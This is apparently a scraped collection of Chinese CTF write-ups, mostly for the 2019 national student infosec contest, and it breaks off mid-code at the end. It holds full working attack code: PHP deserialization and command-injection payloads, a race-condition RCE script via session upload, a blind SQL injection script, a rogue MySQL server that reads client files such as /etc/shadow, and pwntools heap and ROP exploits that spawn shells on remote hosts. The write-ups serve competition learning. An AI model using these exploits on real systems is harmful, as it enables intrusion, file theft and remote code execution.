GetModuleHandleA(&ModuleName); // Ntdll v1 = GetProcAddress(v0, &ProcName); // ZwSetInformationThread v2 = GetCurrentThread(); return ((int (__stdcall *)(HANDLE, signed int, _DWORD, _DWORD))v1)(v2, 17, 0, 0);// ThreadHideFromDebugger 百度一下可以轻松发现这个函数经常被用来反调试，第17个参数正好就是反调用的： 将其首字节改成0xc3，爆破掉即可 后一个函数sub_4028F0同样也是动态获取了4个函数的地址，将它们保存在了一个函数表中留待日后取用。其中一个是IsDebuggerPresent这样的反调函数，另外三个则是VirtualAlloc、VirtualFree和Exit这种有用的函数，因此不可简单Patch 再往后立即就调用了刚才的IsDebuggerPresent，判断到直接Exit 这里Patch或者下断过都行，小问题 TlsCallback_1里则是一个MessageBox，无关紧要 接着进入main主函数 那三个连续的函数不用在意，解密代码很复杂，无需关心 sub_43180里是对Debug断点的Hook 我们知道调试器下断的原理是将某个地址的机器码改为0xcc，使其触发异常，从而被调试器捕捉中断 这个Hook会将0xcc改为0xc3，直接ret，导致不仅调试器捕捉不到断点，而且会直接令程序崩溃 这个函数里除了Hook没有别的东西，直接Patch掉 sub_403010里才是重头戏，通过memcpy将解密后的代码送入开辟出的空间中，然后直接调用 几个函数通过F8步过函数可以大致猜测出功能 关键在change_input和check两个函数中 其实当把那几个反调试通过以后就问题就不大了 动态调试跟进去，发现change_input中将Inputbase64后通过GlobalAddAtom将其加入了全局原子 再往后跟的几个函数都格外的复杂，再加上代码是动态解密的，每次都需要自己MakeCode再F5才能浏览一遍猜测是否需要详细跟踪 事实上在AddAtom之后虽然还有几个函数调用了Input的指针，但它们都是释放空间用的。 这个AddAtom添加了一个全局可用的字符串，必然在某处调用了GlobalGetAtomName 因此不妨稍微忽视一下其他函数，再往后跟 果不其然在v19，即check中捕捉到了GlobalGetAtomName的调用 该函数中生成了一个table，然后将table进行一顿操作后与Input逐字节异或，最后与另一个值进行比较—非常简单粗暴常见的逆向套路了 可以通过dump将table得到，然后效仿操作与结果数组异或从而得到flag 但更简单的方法当然是注意到这两点： 异或的逆运算还是异或 将table进行一顿操作与input完全无关 因此将结果数组直接放入Input的地址中，等到比较的时候，该地址中就是我们需要input的值了 解base64轻松得到flag。 "},"articals/2019national.html":{"url":"articals/2019national.html","title":"2019全国信安赛","keywords":"","body":"2019全国大学生信息安全大赛 本题已开通评论，欢迎在页面最下方留言吐槽。 题目类型： 类型 年份 难度 官方赛事题 2019 中 网上公开WP: https://www.zhaoj.in/read-5417.html https://xz.aliyun.com/t/4906 https://xz.aliyun.com/t/4904 https://www.52pojie.cn/thread-936377-1-1.html http://12end.xyz/essay1/ https://impakho.com/post/ciscn-2019-online-writeup 题目下载： 链接: https://pan.baidu.com/s/1Oz3GjZ7oSdjiFHbz29huMA 提取码: x81y 本站备份WP： 感谢作者：Glzjin、wu1a、warden、lizhirui、12end、七月火 Web 作者：Glzjin、七月火 JustSoso 解法一 题目 知识点：任意文件读取，PHP 反序列化 步骤： 1、打开靶机，发现是这样一个页面。 2、来看看源码。给了参数和提示，让获取 hint.php 的源码。 3、那么就来获取源码看看吧，访问 /?file=php://filter/read=convert.base64-encode/resource=hint.php 4、BASE64 解码一下，得到 hint.php 的源码。 $v) { $this->$k = null; } echo \"Waking up\\n\"; } public function __construct($handle) { $this->handle = $handle; } public function __destruct(){ $this->handle->getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this->file = $file; $this->token_flag = $this->token = md5(rand(1,10000)); } public function getFlag(){ $this->token_flag = md5(rand(1,10000)); if($this->token === $this->token_flag) { if(isset($this->file)){ echo @highlight_file($this->file,true); } } } } ?> 5、重复上面的 3~4 步，获取 index.php 的源码。 '; } if(preg_match(\"/flag/\",$file)){ die('hack attacked!!!'); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload); }else{ echo \"Missing parameters\"; } ?> 6、来审计一下源码。 index.php 有 file 和 payload 两个参数，先 include 了 file 所指向的文件，再经过一系列的检测之后 反序列化 payload。 然后 hint.php 有两个类 Handle 和 Flag。 对于 Handle 类，它的魔术方法 Weakup 会清空其自身的成员变量，将其都置为 null。而其析构函数则会调用自身成员变量 handle 的 getFlag 方法。而 Flag 类就有这个 getFlag 方法了，其中会随机一个 md5(1~10000随机数) 的 flag_token，和自身的 token 做比较，相等就去读文件。看起来我们可以用这里来读 flag.php 文件了。 7、把源码拷到本地，来伪造序列化对象。 $v) { $this->$k = null; } echo \"Waking up\\n\"; } public function __construct($handle) { $this->handle = $handle; } public function __destruct(){ $this->handle->getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this->file = $file; $this->token_flag = $this->token = md5(rand(1,10000)); $this->token = &$this->token_flag; } public function getFlag(){ $this->token_flag = md5(rand(1,10000)); if($this->token === $this->token_flag) { if(isset($this->file)){ echo @highlight_file($this->file,true); } } } } $flag = new Flag(\"flag.php\"); $handle = new Handle($flag); echo serialize($handle).\"\\n\"; ?> 这里我们加了一行： $this->token = &$this->token_flag; 这样做主要是为了下面 getFlag 那的比较，因为这样的引用变量和他所指向的变量一比较，当然相等了。 后面三行就是要求去读 flag.php 文件，然后序列化对象了。 8、运行一下，生成。 9、打上去，注意 Handle 里的 handle 是私有成员变量，所以得特殊处理下，里面的方块那记得换成 %00。还有为了不触发 weak up[1]，所以我们得改下 payload,把成员数目改大些。同时为了绕过后面对于 payload 的检测，我们还要再前面加几个 /[2]。所以这里就是访问 ///?file=hint.php&payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;s:32:”b77375f945f272a2084c0119c871c13c”;s:10:”token_flag”;R:4;}} 参考资料[1]:https://www.jianshu.com/p/67ef6f662a4d 参考资料[2]:http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html 10、访问一下。 11、Flag 到手~ Flag: flag{d3601d22-3d10-440e-84b5-c9faff815551} 解法二 作者：12end 包含session文件以RCE这道题默认没有session，我们可以通过伪造固定session,post一个空文件以及恶意的PHP_SESSION_UPLOAD_PROGRES来执行构造的任意代码。 PHP_SESSION_UPLOAD_PROGRES是一个常量，他是php.ini设置中session.upload_progress.name的默认值，session.upload_progress是PHP5.4的新特征。下面是我本地php5.4的默认配置： 讲一下个别配置的含义： session.upload_progress.cleanup 是否在上传结束清除上传进度信息，默认为on session.upload_progress.enabled 是否开启记录上传进度信息，默认为on session.uploadprogress.prefix 存储上传进度信息的变量前缀，默认为upload_progress session.upload_progress.name POST中代表进度信息的常量名称，默认为PHP_SESSION_UPLOAD_PROGRES如果 _POST[session.upload_progress.name]没有被设置, 则不会报告进度 可以看到，session.upload_progress.cleanup默认是开启的，这意味着我们上传文件后，进度信息会被删除，我们也就不能直接包含session文件，这就需要利用条件竞争，趁进度信息还未被删除时包含session文件。 条件竞争 一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计不合理时，将会导致一系列问题的发生。 我们写一个脚本，一个线程不断上传空文件（同时post伪造的恶意进度信息），另一些线程不停地访问session临时文件，总有几次我们会在服务端还没有删除进度信息时访问到session临时文件。 python脚本： import requests import threading url='http://127.0.0.1/index.php' r=requests.session() headers={ \"Cookie\":'PHPSESSID=123' } def POST(): while True: file={ \"upload\":('','') #上传无效的空文件 } data={ \"PHP_SESSION_UPLOAD_PROGRESS\":'' #恶意进度信息，readfile将直接输出文件内容 } r.post(url,files=file,headers=headers,data=data) def READ(): while True: event.wait() t=r.get(\"http://127.0.0.1/index.php?file=../tmp/tmp/sess_123\") if 'flag' not in t.text: print('[+]retry') else: print(t.text) event.clear() event=threading.Event() event.set() threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start() threading.Thread(target=READ,args=()).start() RCE拿到flag内容：因为比赛是下发的docker容器，写shell意义不大，但是的确通过这个脚本读到了flag。这个方法依赖于php.ini的一些配置选项，以及session目录的信息，不过大多数情况下这些都是默认的，很容易可以猜到 还有更多利用方法，各位师傅们自由发挥。 全宇宙最简单的SQL 题目 知识点：布尔型盲注，Waf Bypass，MySQL 客户端任意文件读取 1、打开靶机。 2、然后测试提交，抓包看看。 3、放到 postman 里试试。 4、不断 fuzz。主要观察到以下几个现象。 username 有注入点。 过滤了 or。 当最终拼接语句无错误时无论结果如何均为 登录失败。 当最终语句有错时返回为 数据库操作失败。 5、根据这两个返回，就可以判断其为 布尔型盲注 了。 6、综上，测试 payload 如下。 username = admin’ union select cot(1 and left(database(),1)>’a’);# 当 left(database(),1)>’a’) 也就是条件为真时，1 and left(database(),1)>’a’ 整个表达式大于 0，没有错误爆出。 当条件为假时，1 and left(database(),1)>’a’ 等于 0，有错误爆出。 上面所说有语句正确执行与否时返回不同，就可以这样区分了。 7、从这儿 http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/ 找了个小脚本，把我们的 payload 放进去，修改一下返回判断条件。 同时注意 or 被过滤了，所以 information_schema 也传不上去了。这里就得自己猜猜表名了。 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import requests def main(): get_all_databases(\"http://39.97.167.120:52105/\") def http_get(url, payload): result = requests.post(url, data={'username': 'admin' + payload, 'password': '123456'}) result.encoding = 'utf-8' if result.text.find('数据库操作失败') == -1: return True else: return False # 获取数据库 def get_all_databases(url): db_nums_payload = \"select count(*) from users\" db_numbers = half(url, db_nums_payload) print(\"长度为：%d\" % db_numbers) # 二分法函数 def half(url, payload): low = 0 high = 126 # print(standard_html) while low %d);#\" % (payload, mid) # print(mid_num_payload) # print(mid_html) if http_get(url, mid_num_payload): low = mid + 1 else: high = mid - 1 mid_num = int((low + high + 1) / 2) return mid_num if __name__ == '__main__': main() 8、不断 fuzz，当 长度不为 0 时就是找到表了。 0，没找到或没数据 1，找到了 9、找到表名为 user，知道表名，不知道列名，那就改下函数，如下面这样整，给表设别名。 # 获取数据库 def get_all_databases(url): db_nums_payload = \"select length(group_concat(a.1)) from (select 1, 2 union select * from user)a\" db_numbers = half(url, db_nums_payload) print(\"长度为：%d\" % db_numbers) db_payload = \"select group_concat(a.1) from (select 1, 2 union select * from user)a\" db_name = \"\" for y in range(1, db_numbers + 1): db_name_payload = \"ascii(substr((\" + db_payload + \"),%d,1))\" % ( y) db_name += chr(half(url, db_name_payload)) print(\"值：\" + db_name) 第一列是用户名。 参看资料：http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-10-1-%E5%88%AB%E5%90%8D 10、再来第二列试试。 # 获取数据库 def get_all_databases(url): db_nums_payload = \"select length(group_concat(a.2)) from (select 1, 2 union select * from user)a\" db_numbers = half(url, db_nums_payload) print(\"长度为：%d\" % db_numbers) db_payload = \"select group_concat(a.2) from (select 1, 2 union select * from user)a\" db_name = \"\" for y in range(1, db_numbers + 1): db_name_payload = \"ascii(substr((\" + db_payload + \"),%d,1))\" % ( y) db_name += chr(half(url, db_name_payload)) print(\"值：\" + db_name) 第二列就是密码了。 似乎还提示我们 flag 在 /fll1llag_h3r3。 11、先用这组用户名密码登录看看，看到可以登录成功。 12、很熟悉的页面，祭出我们的祖传恶意 MySQL 服务器吧。改好要读取的文件，在自己的服务器上运行。 #!/usr/bin/env python #coding: utf8 import socket import asyncore import asynchat import struct import random import logging import logging.handlers PORT = 3306 log = logging.getLogger(__name__) log.setLevel(logging.DEBUG) # tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab') tmp_format = logging.StreamHandler() tmp_format.setFormatter(logging.Formatter(\"%(asctime)s:%(levelname)s:%(message)s\")) log.addHandler( tmp_format ) filelist = ( # r'c:\\boot.ini', # r'c:\\windows\\win.ini', # r'c:\\windows\\system32\\drivers\\etc\\hosts', '/fll1llag_h3r3', # '/etc/shadow', ) #================================================ #=======No need to change after this lines======= #================================================ __author__ = 'Gifts' def daemonize(): import os, warnings if os.name != 'posix': warnings.warn('Cant create daemon on non-posix system') return if os.fork(): os._exit(0) os.setsid() if os.fork(): os._exit(0) os.umask(0o022) null=os.open('/dev/null', os.O_RDWR) for i in xrange(3): try: os.dup2(null, i) except OSError as e: if e.errno != 9: raise os.close(null) class LastPacket(Exception): pass class OutOfOrder(Exception): pass class mysql_packet(object): packet_header = struct.Struct('> 16, 0, self.packet_num) result = \"{0}{1}\".format( header, self.payload ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = ord(raw_data[0]) payload = raw_data[1:] return mysql_packet(packet_num, payload) class http_request_handler(asynchat.async_chat): def __init__(self, addr): asynchat.async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.state = 'LEN' self.sub_state = 'Auth' self.logined = False self.push( mysql_packet( 0, \"\".join(( '\\x0a', # Protocol '5.6.28-0ubuntu0.14.04.1' + '\\0', '\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00', )) ) ) self.order = 1 self.states = ['LOGIN', 'CAPS', 'ANY'] def push(self, data): log.debug('Pushed: %r', data) data = str(data) asynchat.async_chat.push(self, data) def collect_incoming_data(self, data): log.debug('Data recved: %r', data) self.ibuffer.append(data) def found_terminator(self): data = \"\".join(self.ibuffer) self.ibuffer = [] if self.state == 'LEN': len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1 if len_bytes 13、在页面上填好信息，点提交。 14、到自个儿的服务器上看看，Flag 文件也读到了。 15、Flag 到手~ Flag：flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade} love_math 题目 知识点：命令注入与条件利用 1、打开靶机。发现似乎是一个计算器。 2、提交，抓包看看。 3、可以看到直接提交给 calc.php 的，那么我们就访问这个文件看看。 4、源码出来了。 = 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 5、审计一下源码。 先判断 c 这个参数有没有，有的话就判断长度，小于 80 字节就继续往下走。然后拦截一大堆符号，再判断参数里的文本段是否在函数白名单内，都在的话，就继续执行。 6、来看看他的函数表吧。 http://www.w3school.com.cn/php/php_ref_math.asp 这个特别有意思，base_convert() 可以任意进制转换，那么我们就可以把十进制数转换为 36 进制数，这样 a~z 我们就都可以用了。 7、来一个试试。 转换工具：http://www.atool9.com/hexconvert.php 8、构造 payload 试试。访问 /calc.php?c=base_convert(55490343972,10,36)() 9、成了，那继续研究怎么绕过长度限制吧。这里的思路，就是先拿到 _GET，然后用里面的参数来作为函数的名字（这里要读文件，就是 file_get_contents 了）和参数（文件路径）了。 10、不断 fuzz，发现如下的 payload 可以。 /calc.php?abs=flag.php&pow=show_source&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs}) 解释一下，相当于先定义一个 pi 变量，值为 base_convert(37907361743,10,36)(dechex(1598506324)) 的结果，这里两个函数都是白名单里的 可以绕过。而 dexhex 则就是先把 “_GET” 的十进制表示转换为十六进制表示，然后其作为 base_convert(37907361743,10,36)() 的参数，而这里 base_convert(37907361743,10,36)() 就相当于 hex2bin()，把 hex 转换成文本。然后，得到 _GET 以后再后面用 ($$pi){pow}($$pi{abs}) 来调用 pow 参数里存的方法名，abs 参数里存的参数，这里的字段都在白名单，可以正确绕过。 11、打过去。 12、Flag 到手~ Flag：flag{79480116-456e-4a90-86e8-4b4b885354b9} RefSpace 通过 php伪协议 可以获得题目环境中的文件结构如下： ➜ html tree.├── app│ ├── flag.php│ ├── index.php│ └── Up10aD.php├── backup.zip├── flag.txt├── index.php├── robots.txt└── upload2 directories, 7 files 源码如下： 可以看到 index.php 中存在任意文件包含，但是限制了文件名后缀只能是 .php，而 app/Up10aD.php 文件中存在上传功能，刚好可以配合前面的文件包含进行 getshell 。具体可以参考：zip或phar协议包含文件 。getshell之后，只在服务器上发现了加密后的flag.txt。在 app/flag.php 开头添加上如下代码，访问时 $key 值随便填。 namespace interesting; function sha1($var) { // 调用类的私有、保护方法 $class = new \\ReflectionClass('interesting\\FlagSDK'); $method = $class->getMethod('getHash'); $method->setAccessible(true); $instance = $class->newInstance(); return $method->invoke($instance); } 其原理就是通过命名空间，定义一个同名函数 sha1 ，在代码调用时，会优先调用本命名空间中的同名函数。另外还有一个考点就是通过反射调用类的私有、保护方法，具体百度即可。绕过sha1的比较，我们就能拿到flag了，backup.zip/sdk开发文档.txt 中的 return \"too{young-too-simple}\" 只是个例子，其真正的语句类似 return openssl_decrypt(file_get_contents(‘flag路径), '加密算法', $key)。 其他解法: 解法二：作者：zsx Misc 作者：wu1a 签到题 打开摄像头后，有三个人被识别有绿圈，就代表成功了，cmd 界面弹出 flag saleae 一开始作为一个 web 手，完全没有接触过工控的题目，但受到题目名称的启发，搜了一下这个东西用什么软件打开，就下载了 Logic 这个软件，然后打开题目看到有过滤选项 而且只有 0 和 2 频道有波形图，调整过滤规则得到了导出后 然后编辑一下就是 flag 24c 打开给的 24c.logicdata 文件，得到：选择 i2c 过滤规则直接出现了 flag 字样直接就去提交了这个分离出来的 flag 然后一直报错，一度怀疑题目错了。直到看到有一段有读写规则的转换，才知道自己不清楚这些 flag 字段是怎么拼接的。因为对工控不是很熟悉，百度了一下 24C 芯片的数据读写规则如下，8bitdata 接上 1bitack我们导出一下获得的数据我们得到的三个字段分别为 f163bdf4e},flag{c4649e10-e9b5-4d90-a883-41c,ac现在根据规则对这三段进行拼接再导出写入的地址顺序表了解一下 24c 元件的工作原理后，再通过上表确认了 ac 并不是写在最后 flag 那一段后面的，而是插在 flag{c4649e10-e9b5-4d90-a883-41c 中的。这样就得到了拼接的顺序，得到了正确的 flag badusb 直接先打开读文件：直接调整规则进行分析，并查看数据分析结果，最终发现只在如下图所示的规则下找到了flag 字段在最后一段数据处发现了 flag导出编辑和昨天的第一题工控一样拼接后就得到了最后的 flag Crypto 作者：wu1a、匿名 puzzles 作者：匿名 Question0 这题就是计算一个四元一次方程组，使用Python里的numpy模块进行求解。 得到结果[4006. 3053. 2503. 2560.] 整理一下得到fa6bed9c7a00 Question1 question1思考了一会，尝试从26364809开始搜素数，发现26364809是第2个素数，26366033是第76个，26366621是第113个。成一个公差为37的等差数列。所以part1是第39个素数，即26365399。part1=1924dd7 Question2、3、4 第2 3 4题在网上都可以搜到类似的题目 第一就是简单的求极限和积分。 part2=(1+91+7+1)*77=7700 转换成flag格式 part2=1e14 第三题是一道物理题目->->代入数据，最后得到结果part3=18640转换成flag格式 part3=48d0 第四题考的是三重积分令x=rcosa,y=rsina。可以将上式转化为：这样就将三重积分转化成了三次定积分。并结合等式左边的式子得出结果。part4=40320 转化成flag格式 part4=9d80 最后拼接在一起得到flag Part_des Key map 为十六进制数，转换成二进制后发现为 768 位，即 16*48，是des加密的16轮子密钥，从网上找到 des 的解密脚本，修改一下即可解出 Warmup 打开脚本查看加密逻辑，发现每次 nc连上服务器后会自动生成随机的16位key和4 位prefix、 suffix，再用 prefix 和 suffix 生成 64 位的 count，然后用 count 和 key 生成 cipher。服务得到 我的输入，在后面拼接正确的 flag 后进行 aes 加密并输出。测试一下服务爆破即可 #coding:utf-8 #__author__:wu1a from pwn import * import string def boom(k,flag): for i in range(k,len(string)): payload = flag + string[i] p.sendline(payload) aaa = p.recvline()[17:].replace(\"\\n\",\"\") aaa = aaa[:(len(flag)+1)*2] # print aaa if aaa in flag_aes: print \"ok\",payload boom(0,payload) else: pass # context.log_level='debug' p = remote(\"fc32f84bc46ac22d97e5f876e3100922.kr-lab.com\",12345) string=\"{}\" + string.ascii_lowercase + \"-0123456789\" flag=\"flag\" p.recvuntil(\"Welcome to flag getting system\\n\") p.sendline(\"\") flag_aes=p.recvline()[17:].replace(\"\\n\",\"\") log.info(\"flag_aes -> \" + flag_aes) boom(0,flag) # p.interactive() Asymmetric 打开加密脚本后发现过程类似 RSA 加密，尝试用 RSA 解密，先分解 n 得到 pP=1657407551907933046558545060527940723781810462521183676934573856328183290415 404194886254720077100621286329426643663835514524985415605387445829227138086113 201767704015876746181218857199538311224872809784181103805973587479154209280538 60076414097300832349400288770613227105348835005596365488460445438176193451867 R=4 根据欧拉函数 p4-p3 计算 n，再计算得到 flag PWN 作者：warden、wu1a your_pwn 可重复利用的单字节读写的漏洞. 先直接读取栈上的返回地址泄露pie基址.然后构造ROP链打印库函数地址泄露libc.直接调用system(binsh);获得flag. from pwn import * context.log_level = 'debug' pop_rdi_ret = 0xd03 pop_rsi_r15_ret = 0xd01 #r = process(\"./pwn\") r = remote(\"1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com\",\"57856\") r.recvuntil(\"name:\") r.sendline(\"w4rd3n\") def get(p): i = 0 ll = 0 while(1): r.recvuntil(\"index\\n\") r.sendline(str(i + p)) data = r.recvuntil(\"value\\n\")[:-17] data = int(data[-2:],16) if(i daily remove的时候没有对index进行范围检测. 先利用unsorted bin泄露libc,再利用fastbin单链表泄露heap基址. 申请一个chunk,在里面伪造一个堆指针和对应的faker chunk.free掉这个faker chunk,通过edit构造其fd到bss上,由于length可控,通过remove构造出一个chunk头部绕过检查.成功fastbin attack,获得任意读写的能力,由于程序开了Full RELRO所以劫持__free_hook调用system(binsh);获得flag. from pwn import * context.log_level = 'debug' #r = process(\"./pwn\") ptr = 0x602060 r = remote(\"85c3e0fcae5e972af313488de60e8a5a.kr-lab.com\", \"58512\") def show(): r.sendline(str(1)) data = r.recvuntil(\"Your choice:\") return data def add(length, content): r.sendline(str(2)) r.recvuntil(\"of daily:\") r.sendline(str(length)) r.recvuntil(\"daily\\n\") r.send(content) r.recvuntil(\"Your choice:\") def edit(index, content): r.sendline(str(3)) r.recvuntil(\"of daily:\") r.sendline(str(index)) r.recvuntil(\"daily\\n\") r.send(content) r.recvuntil(\"Your choice:\") def remove(index): r.sendline(str(4)) r.recvuntil(\"of daily:\") r.sendline(str(index)) r.recvuntil(\"Your choice:\") r.recvuntil(\"Your choice:\") add(0x100, 'a')#0 add(0x100, 'b')#1 add(0x100, 'c')#2 add(0x100, 'd')#3 remove(0) remove(2) add(0x100, 'a' * 8)#0 add(0x100, 'a' * 8)#2 r.sendline(str(1)) r.recvuntil(\"aaaaaaaa\") heap = u64(r.recvuntil(\"1 :\")[:-3].ljust(8,'\\0')) - 0x220 r.recvuntil(\"aaaaaaaa\") libc = u64(r.recvuntil(\"3 :\")[:-3].ljust(8,'\\0')) - 0x3c4b78 print \"heap: \" + hex(heap) print \"libc: \" + hex(libc) remove(0) remove(1) remove(2) remove(3) add(0x60, p64(heap + 0x30) * 2 + p64(0) + p64(0x51))#0 add(0x20, 'a')#1 add(0x50, 'a')#2 add(0x20, 'a')#3 remove((heap + 0x18 - ptr - 8) / 0x10) edit(0, p64(0) * 3 + p64(0x51) + p64(ptr + 0x18)) remove(1) add(0x40, 'a')#1 add(0x40, 'a')#4 edit(4, p64(ptr)) edit(2, p64(0x100) + p64(ptr) + p64(0) * 4) edit(0, p64(0x100) + p64(ptr) + p64(0x100) + p64(libc + 0x3c67a8) + p64(0x100) + p64(libc + 0x18cd57)) edit(1, p64(libc + 0x045390)) #gdb.attach(r) r.sendline(str(4)) r.recvuntil(\"of daily:\") r.sendline(str(2)) r.interactive() baby_pwn ret2dl in x86,没有可供leak的函数.保护很少,想起之前的0ctf2018 babystack,修改脚本直接打. import sys import roputils from pwn import * context.log_level = 'debug' #r = process(\"./pwn\") r = remote(\"c346dfd9093dd09cc714320ffb41ab76.kr-lab.com\", \"56833\") rop = roputils.ROP('./pwn') addr_bss = rop.section('.bss') buf1 = 'A' * 0x2c buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100) r.send(buf1) buf2 = rop.string('/bin/sh') buf2 += rop.fill(20, buf2) buf2 += rop.dl_resolve_data(addr_bss + 20, 'system') buf2 += rop.fill(100, buf2) r.send(buf2) buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss) r.send(buf3) #gdb.attach(r) r.interactive() Virtual 理解程序逻辑. 首先是store_instruction函数将输入通过分隔符分类为各种操作符并保存在堆中,store_num同理.其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据). 重点就是op函数. 这里不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里IDA反汇编有问题,没有识别出函数调用,实际上i会被赋值为函数调用的返回值. 这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先push. 关键函数是load和save,知道偏移就可以任意读写.先使用load泄露堆上的堆地址,由于没开pie,通过-和/求出.got[puts]和此处偏移,再次load泄露libc,处理与system的偏移获得system地址.不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得.got[puts]偏移,调用save成功劫持puts@plt.突然发现username作用,开始试了/bin/sh,ls,cat flag什么的都是comment not found,最后/bin/bash成功. from pwn import * #context.log_level = 'debug' #r = process(\"./pwn\") r = remote(\"a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com\", \"40003\") r.recvuntil(\"Your program name:\\n\") r.sendline(\"/bin/bash\") r.recvuntil(\"Your instruction:\\n\") payload = \"push push push load push sub div sub load push add\" payload += \" push push push load push sub div sub save\" #payload = \"push push push load push sub div sub load pop\" r.sendline(payload) #gdb.attach(r) r.recvuntil(\"Your stack data:\\n\") #payload = \"-1 8 -5 4210720\" payload = \"-1 8 -5 4210720 -172800 -1 8 -6 4210720\" #0x404020 = 4210720,offset = -172800,one_gadget = -173178 r.sendline(payload) #print r.recv() r.interactive() bms 远端环境是libc2.26,可以使用tcache攻击,利用double free把chunk分配在stdout附近,使tcache bin指向_IO_2_1_stdout_. 修改结构体泄露libc,再次使用tcache攻击分配chunk到__free_hook,劫持为one_gadget,调用free获得shell. from pwn import * context.log_level = 'debug' #r = process(\"./pwn\") r = remote(\"39.106.224.151\", \"60002\") def add(name, length, content): r.send(str(1)) r.recvuntil(\"book name:\") r.send(name) r.recvuntil(\"description size:\") r.send(str(length)) r.recvuntil(\"description:\") r.send(content) r.recvuntil(\">\\n\") def remove(index): r.sendline(str(2)) r.recvuntil(\"index:\") r.sendline(str(index)) r.recvuntil(\">\\n\") r.recvuntil(\"username:\") r.send(\"admin\\n\\x00\") r.recvuntil(\"password:\") r.send(\"frame\\n\\x00\") r.recvuntil(\">\\n\") add(\"a\", 0xf0, \"a\")#0 remove(0) remove(0) add(\"a\", 0xf0, p64(0x602020))#1 add(\"a\", 0xf0, p64(0x602020))#2 add(\"a\", 0xf0, p8(0x20))#3 r.send(str(1)) r.recvuntil(\"book name:\") r.send(\"a\") r.recvuntil(\"description size:\") r.send(str(0xf0)) r.recvuntil(\"description:\") r.send(p64(0xfbad2887) + p64(0x601F70) * 4)#4 libc = u64(r.recvuntil(\">\\n\")[:6].ljust(8, '\\0')) - 0x78460 add(\"a\", 0xe0, \"a\")#5 remove(5) remove(5) add(\"a\", 0xe0, p64(libc + 0x3dc8a8))#6 add(\"a\", 0xe0, p64(libc + 0x3dc8a8))#7 add(\"a\", 0xe0, p64(libc + 0x47c46))#8 r.sendline(str(2)) r.recvuntil(\"index:\") r.sendline(str(5)) #gdb.attach(r) print \"libc: \" + hex(libc) r.interactive() double 这题的点找了好久，一直没 get 到，（没注意题目名，手动滑稽），研究了各种姿势，回原点，两个同样的文件释放会报 double free 的错，才发现自己漏看了一块地方，然后利用文件内容一致，引用同一文件。实现 double free。然后 fastbin attack再次 diss，主办方的 check 竟然 system(“sh”) ，命令在容器里啥权限都没，还不让我过，搞得我只好找 onegadget from pwn import * context.log_level = \"debug\" p = process(\"./pwn\") p = remote(\"e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com\",40002) elf = ELF('./pwn') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def add(content): p.recvuntil('> ') p.sendline('1') p.recvuntil('Your data:\\n') p.send(content) def edit(index,content): p.recvuntil('> ') p.sendline('3') p.recvuntil('Info index: ') p.sendline(str(index)) p.send(content) def show(index): p.recvuntil('> ') p.sendline('2') p.recvuntil('Info index: ') p.sendline(str(index)) def 